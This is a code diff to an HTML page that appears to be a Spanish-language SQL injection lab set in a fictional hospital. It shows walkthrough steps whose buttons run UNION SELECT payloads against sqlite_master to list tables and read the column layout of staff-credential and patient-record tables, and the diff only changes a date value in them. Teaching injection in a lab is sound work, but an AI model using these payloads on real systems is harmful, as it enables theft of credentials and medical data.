@@ -347,8 +347,8 @@
                         <summary><strong>Paso 4:</strong> Enumerar Nombres de Tablas</summary>
                         <p class="step-desc">Descubrir las tablas de usuarios, pacientes y farmacia registradas en `sqlite_master`.</p>
                         <div class="payload-box">
-                            <code>' UNION SELECT 1, 'TABLA DE BD: ' || name, type, 'Estructura: ' || sql, sql, '2026-01-01' FROM sqlite_master WHERE type='table' -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'TABLA DE BD: ' || name, type, 'Estructura: ' || sql, sql, '2026-01-01' FROM sqlite_master WHERE type='table' -- ">▶️ Probar</button>
+                            <code>' UNION SELECT 1, 'TABLA DE BD: ' || name, type, 'Estructura: ' || sql, sql, '2017-05-15' FROM sqlite_master WHERE type='table' -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'TABLA DE BD: ' || name, type, 'Estructura: ' || sql, sql, '2017-05-15' FROM sqlite_master WHERE type='table' -- ">▶️ Probar</button>
                         </div>
                     </details>
 
@@ -358,13 +358,13 @@
                         <p class="step-desc">¡No asumas nombres de columnas! Lee la sentencia `CREATE TABLE` en la columna `sql` de `sqlite_master` para descubrir que existen las columnas `email`, `password_hash`, `pin_acceso_quirofano` y `rol`.</p>
                         <div class="payload-box">
                             <span class="payload-label">Columnas de Usuarios:</span>
-                            <code>' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2026-01-01' FROM sqlite_master WHERE tbl_name='personal_medico_usuarios' -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2026-01-01' FROM sqlite_master WHERE tbl_name='personal_medico_usuarios' -- ">▶️ Ver Columnas Usuarios</button>
+                            <code>' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2017-05-15' FROM sqlite_master WHERE tbl_name='personal_medico_usuarios' -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2017-05-15' FROM sqlite_master WHERE tbl_name='personal_medico_usuarios' -- ">▶️ Ver Columnas Usuarios</button>
                         </div>
                         <div class="payload-box" style="margin-top:5px;">
                             <span class="payload-label">Columnas de Pacientes:</span>
-                            <code>' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2026-01-01' FROM sqlite_master WHERE tbl_name='historias_clinicas_pacientes' -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2026-01-01' FROM sqlite_master WHERE tbl_name='historias_clinicas_pacientes' -- ">▶️ Ver Columnas Pacientes</button>
+                            <code>' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2017-05-15' FROM sqlite_master WHERE tbl_name='historias_clinicas_pacientes' -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, 'ESQUEMA TABLA: ' || tbl_name, 'DDL COLUMNAS', sql, sql, '2017-05-15' FROM sqlite_master WHERE tbl_name='historias_clinicas_pacientes' -- ">▶️ Ver Columnas Pacientes</button>
                         </div>
                     </details>
 
